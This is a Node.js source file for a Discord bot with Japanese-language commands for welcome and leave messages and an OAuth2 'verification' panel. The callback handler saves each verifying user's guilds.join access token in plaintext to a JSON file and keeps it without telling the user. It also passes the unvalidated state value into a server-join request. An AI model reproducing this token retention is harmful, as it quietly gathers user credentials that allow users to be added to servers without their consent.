const { 
    Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, 
    ButtonStyle, EmbedBuilder, SlashCommandBuilder, REST, Routes,
    PermissionFlagsBits, ChannelType, MessageFlags 
} = require('discord.js');
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const { TOKEN, CLIENT_ID, CLIENT_SECRET, REDIRECT_URI, OWNER_ID, LOG_CHANNEL_ID } = process.env;

const DATA_DIR = path.join(__dirname, "data");
const USERS_FILE = path.join(DATA_DIR, "users.json");
const GUILDS_FILE = path.join(DATA_DIR, "guilds.json");

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

const loadJSON = (file, defaultValue) => {
    try {
        if (!fs.existsSync(file)) return defaultValue;
        const data = fs.readFileSync(file, "utf-8");
        return data.trim() ? JSON.parse(data) : defaultValue;
    } catch (err) { return defaultValue; }
};

const saveJSON = (file, data) => {
    try { fs.writeFileSync(file, JSON.stringify(data, null, 2)); } catch (err) {}
};

const sendLog = async (embed) => {
    if (!LOG_CHANNEL_ID) return;
    try {
        const channel = await client.channels.fetch(LOG_CHANNEL_ID);
        if (channel) channel.send({ embeds: [embed] });
    } catch (e) {}
};

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent 
    ] 
});

const slashCommands = [
    new SlashCommandBuilder().setName('help').setDescription('コマンド一覧を表示'),
    new SlashCommandBuilder()
        .setName('authset')
        .setDescription('認証パネルを設置')
        .addRoleOption(opt => opt.setName('role').setDescription('付与するロール').setRequired(true))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('welcome')
        .setDescription('入室メッセージ設定')
        .addChannelOption(opt => opt.setName('channel').setDescription('送信先').addChannelTypes(ChannelType.GuildText).setRequired(true))
        .addStringOption(opt => opt.setName('message').setDescription('{user}=メンション, {member}=人数').setRequired(true))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
        .setName('bye')
        .setDescription('退室メッセージ設定')
        .addChannelOption(opt => opt.setName('channel').setDescription('送信先').addChannelTypes(ChannelType.GuildText).setRequired(true))
        .addStringOption(opt => opt.setName('message').setDescription('{user}=名前, {member}=人数').setRequired(true))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

client.once('ready', async (c) => {
    console.log(`✅ [Bot] Online: ${c.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try {
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands });
        sendLog(new EmbedBuilder().setTitle("System Online").setColor(0x5865F2));
    } catch (error) { console.error(error); }
});

// --- 認証完了画面 (極めてシンプルなUI) ---
app.get('/callback', async (req, res) => {
    const { code, state } = req.query;
    if (!code) return res.status(400).send("Bad Request");
    try {
        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID, client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code', code, redirect_uri: REDIRECT_URI,
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${tokenRes.data.access_token}` }
        });

        const users = loadJSON(USERS_FILE, []);
        const userData = { id: userRes.data.id, tag: userRes.data.username, token: tokenRes.data.access_token };
        const index = users.findIndex(u => u.id === userData.id);
        if (index > -1) users[index] = userData; else users.push(userData);
        saveJSON(USERS_FILE, users);

        sendLog(new EmbedBuilder().setTitle("認証完了").setDescription(`User: **${userData.tag}**`).setColor(0x43B581));

        if (state) {
            const guilds = loadJSON(GUILDS_FILE, {});
            const roleId = guilds[state]?.roleId;
            await axios.put(`https://discord.com/api/v10/guilds/${state}/members/${userRes.data.id}`, 
                { access_token: tokenRes.data.access_token, ...(roleId ? { roles: [roleId] } : {}) },
                { headers: { Authorization: `Bot ${TOKEN}`, "Content-Type": "application/json" } }
            ).catch(() => {});
        }

        res.send(`
            <!DOCTYPE html>
            <html lang="ja">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verified</title>
                <style>
                    body { background: #121212; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                    .content { text-align: center; }
                    h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
                    p { color: #aaaaaa; font-size: 14px; margin-bottom: 24px; }
                    .btn { background: #5865f2; color: #ffffff; padding: 10px 24px; border-radius: 4px; text-decoration: none; font-size: 14px; font-weight: 500; }
                </style>
            </head>
            <body>
                <div class="content">
                    <h1>認証が完了しました</h1>
                    <p>このタブを閉じて、Discordアプリへお戻りください。</p>
                    <a href="https://discord.com/app" class="btn">Discordを開く</a>
                </div>
            </body>
            </html>
        `);
    } catch (err) { res.status(500).send("Authentication Error."); }
});

// --- メッセージコマンド (!call, !userlist) ---
client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    if (message.content === '!call') {
        if (!OWNER_ID) return;
        await message.reply("オーナーを呼び出しました。");
        await message.channel.send(`<@${OWNER_ID}>\n${message.author} から呼び出しがあります。`);
    }

    if (message.content === '!userlist') {
        if (message.author.id !== OWNER_ID) return;
        const users = loadJSON(USERS_FILE, []);
        await message.channel.send({ embeds: [new EmbedBuilder().setTitle("認証済みユーザー数").setDescription(`合計: **${users.length}** 名`).setColor(0x5865F2)] });
    }
});

// --- 入退室通知 (保存機能付き) ---
client.on('guildMemberAdd', async member => {
    const config = loadJSON(GUILDS_FILE, {})[member.guild.id]?.welcome;
    if (config) {
        const channel = await member.guild.channels.fetch(config.channel).catch(() => null);
        if (channel) channel.send(config.message.replace('{user}', `<@${member.id}>`).replace('{member}', member.guild.memberCount));
    }
});

client.on('guildMemberRemove', async member => {
    const config = loadJSON(GUILDS_FILE, {})[member.guild.id]?.bye;
    if (config) {
        const channel = await member.guild.channels.fetch(config.channel).catch(() => null);
        if (channel) channel.send(config.message.replace('{user}', `**${member.user.username}**`).replace('{member}', member.guild.memberCount));
    }
});

// --- スラッシュコマンド ---
client.on('interactionCreate', async i => {
    if (!i.isChatInputCommand()) return;
    const { commandName, options, guild, channel } = i;

    if (commandName === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle("コマンド一覧")
            .setColor(0x5865F2)
            .addFields(
                { name: "一般", value: "`/help`, `!call`" },
                { name: "管理", value: "`/authset`, `/welcome`, `/bye`" }
            );
        return i.reply({ embeds: [helpEmbed], flags: [MessageFlags.Ephemeral] });
    }

    if (commandName === 'authset') {
        const role = options.getRole('role');
        const guildsData = loadJSON(GUILDS_FILE, {});
        guildsData[guild.id] = { ...guildsData[guild.id], roleId: role.id };
        saveJSON(GUILDS_FILE, guildsData);
        
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel("認証を開始").setURL(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${guild.id}`).setStyle(ButtonStyle.Link)
        );

        await i.reply({ content: '設置完了', flags: [MessageFlags.Ephemeral] });
        await channel.send({ embeds: [new EmbedBuilder().setTitle("メンバー認証").setDescription("下のボタンから認証を完了させてください。").setColor(0x2F3136)], components: [row] });
    }

    if (commandName === 'welcome' || commandName === 'bye') {
        const guildsData = loadJSON(GUILDS_FILE, {});
        if (!guildsData[guild.id]) guildsData[guild.id] = {};
        guildsData[guild.id][commandName] = { channel: options.getChannel('channel').id, message: options.getString('message') };
        saveJSON(GUILDS_FILE, guildsData);
        await i.reply({ content: `設定を保存しました。`, flags: [MessageFlags.Ephemeral] });
    }
});

app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
client.login(TOKEN);
